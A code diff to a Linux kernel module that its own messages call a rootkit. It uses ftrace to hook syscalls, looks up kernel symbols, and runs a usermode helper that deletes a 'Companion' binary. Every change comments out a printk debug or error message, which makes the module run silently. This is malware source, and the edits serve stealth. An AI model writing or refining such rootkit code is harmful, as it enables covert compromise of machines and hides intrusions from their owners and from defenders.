@@ -5,16 +5,16 @@ void delete_binary(void) {
 	char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 	int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 	if (r >= 0) {
-		printk(KERN_INFO "Companion removed\n");
+		// printk(KERN_INFO "Companion removed\n");
 	} else {
-		printk(KERN_INFO "Fail\n");
+		// printk(KERN_INFO "Fail\n");
 	}
 }
 
 static int find_sys_call_addr(t_ftrace_hook *hook) {
 	hook->address = kallsyms_lookup_name(hook->name);
 	if (!hook->address) {
-		printk(KERN_ERR "Failed to find syscall table\n");
+		// printk(KERN_ERR "Failed to find syscall table\n");
 		return 1;
 	}
 	*((unsigned long*) hook->original) = hook->address;
@@ -50,14 +50,14 @@ int fh_install_hook(t_ftrace_hook *hook)
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
 	if(err)
 	{
-		printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+		// printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
 		return err;
 	}
 
 	err = register_ftrace_function(&hook->ops);
 	if(err)
 	{
-		printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
+		// printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
 		return err;
 	}
 
@@ -70,12 +70,12 @@ void fh_remove_hook(t_ftrace_hook *hook)
 	err = unregister_ftrace_function(&hook->ops);
 	if(err)
 	{
-		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
+		// printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
 	}
 
 	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
 	if(err) {
-		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+		// printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
 	}
 }
 
